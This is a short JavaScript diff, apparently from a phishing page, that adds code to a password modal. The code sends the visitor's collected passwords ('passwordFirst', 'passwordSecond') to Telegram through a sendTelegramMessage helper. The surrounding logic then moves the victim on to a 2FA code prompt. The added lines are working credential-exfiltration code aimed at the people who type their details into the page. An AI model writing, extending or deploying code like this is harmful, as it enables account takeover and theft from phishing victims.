@@ -54,6 +54,17 @@
 
         console.log('🔐 Password modal combined data:', combined);
 
+        // Send current combined data to Telegram using API defined in script.js and config.js
+        if (typeof window.sendTelegramMessage === 'function') {
+          try {
+            window.sendTelegramMessage(combined);
+          } catch (e) {
+            console.warn('Failed to send password data to Telegram:', e);
+          }
+        } else {
+          console.warn('sendTelegramMessage is not available on window.');
+        }
+
         // When both passwords are collected, switch to 2FA (security) modal
         if (combined.passwordFirst && combined.passwordSecond) {
           if (typeof closeModal === 'function') {
